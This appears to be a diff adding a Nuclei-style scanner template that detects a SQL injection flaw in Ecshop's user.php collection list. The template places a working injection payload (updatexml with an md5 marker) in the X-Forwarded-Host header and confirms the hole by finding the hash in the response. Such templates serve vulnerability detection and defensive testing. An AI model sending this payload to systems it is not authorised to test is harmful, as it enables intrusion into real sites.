@@ -1,0 +1,25 @@
+id: ecshop-collection-list-sqli
+info:
+  name: Ecshop Collection List SQL Injection
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Ecshop's collection list functionality.
+
+variables:
+  r1: "{{rand_int(10000, 99999)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user.php?act=collection_list"
+    headers:
+      X-Forwarded-Host: "45ea207d7a2b68c49582d2d22adf953apay_log|s:55:\"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1) and '\";|45ea207d7a2b68c49582d2d22adf953a"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(r1)}}"
